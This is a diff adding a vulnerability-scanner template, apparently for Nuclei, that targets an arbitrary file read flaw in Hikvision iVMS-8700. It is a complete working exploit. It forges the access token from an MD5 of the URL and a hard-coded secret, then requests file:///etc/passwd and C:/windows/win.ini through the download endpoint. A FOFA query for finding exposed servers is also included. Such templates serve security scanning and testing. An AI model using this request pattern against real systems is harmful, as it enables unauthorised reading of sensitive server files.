@@ -1,0 +1,33 @@
+id: hikvision-ivms-triggerSnapshot-download-fileread
+
+info:
+  name: 海康威视 ivms /eps/api/triggerSnapshot/download - fileread
+  author: leadlife
+  severity: high
+  description: Hikvision iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-911494769"
+    repair: 建议您更新当前系统或软件至最新版，完成漏洞的修复。
+  tags: hikvision,ivms,fileread
+
+variables:
+  str0: '{{BaseURL}}/eps/api/triggerSnapshot/downloadsecretKeyIbuilding'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/eps/api/triggerSnapshot/download?token={{toupper(md5(str0))}}&fileUrl=file:///C:/windows/win.ini&fileName=1"
+      - "{{BaseURL}}/eps/api/triggerSnapshot/download?token={{toupper(md5(str0))}}&fileUrl=file:///etc/passwd&fileName=1"
+    
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
